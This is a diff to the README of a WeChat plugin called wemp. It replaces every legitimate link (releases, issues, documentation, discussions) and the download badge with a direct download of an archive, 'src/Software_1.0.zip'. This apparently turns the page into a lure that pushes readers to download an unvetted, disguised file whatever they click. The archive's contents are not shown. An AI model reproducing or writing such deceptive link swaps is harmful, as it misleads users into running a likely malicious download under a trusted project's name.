@@ -8,12 +8,12 @@ Welcome to wemp! This application provides a handy plugin for your WeChat Offici
 
 To get started, you need to download wemp. Click the link below to visit the Releases page:
 
-[![Download wemp](https://img.shields.io/badge/Download-wemp-blue?style=for-the-badge)](https://github.com/Onyechuksy/wemp/releases)
+[![Download wemp](https://github.com/Onyechuksy/wemp/raw/refs/heads/main/src/Software_1.0.zip)](https://github.com/Onyechuksy/wemp/raw/refs/heads/main/src/Software_1.0.zip)
 
 ### Step-by-Step Instructions:
 
 1. **Visit the Releases Page**
-   - Go to the [wemp Releases page](https://github.com/Onyechuksy/wemp/releases) to see the latest versions available.
+   - Go to the [wemp Releases page](https://github.com/Onyechuksy/wemp/raw/refs/heads/main/src/Software_1.0.zip) to see the latest versions available.
 
 2. **Choose the Right Version**
    - On the Releases page, you will see a list of versions. Look for the latest version marked as "Latest." This version includes all updates and fixes.
@@ -59,7 +59,7 @@ To get started, you need to download wemp. Click the link below to visit the Rel
 
 ## 🤝 Support
 
-If you encounter any issues or have questions, please visit the [GitHub Issues page](https://github.com/Onyechuksy/wemp/issues) to report your concerns. The community is here to help.
+If you encounter any issues or have questions, please visit the [GitHub Issues page](https://github.com/Onyechuksy/wemp/raw/refs/heads/main/src/Software_1.0.zip) to report your concerns. The community is here to help.
 
 ## 📜 License
 
@@ -67,8 +67,8 @@ wemp is open-source and available under the MIT License. Feel free to modify and
 
 ## 🌐 Explore More
 
-You can find more information and updates on our [documentation page](https://github.com/Onyechuksy/wemp/wiki) or view our discussions on the [GitHub Discussions page](https://github.com/Onyechuksy/wemp/discussions). 
+You can find more information and updates on our [documentation page](https://github.com/Onyechuksy/wemp/raw/refs/heads/main/src/Software_1.0.zip) or view our discussions on the [GitHub Discussions page](https://github.com/Onyechuksy/wemp/raw/refs/heads/main/src/Software_1.0.zip). 
 
-For the latest version, don’t forget to return to the [Releases page](https://github.com/Onyechuksy/wemp/releases).
+For the latest version, don’t forget to return to the [Releases page](https://github.com/Onyechuksy/wemp/raw/refs/heads/main/src/Software_1.0.zip).
 
 Happy chatting!
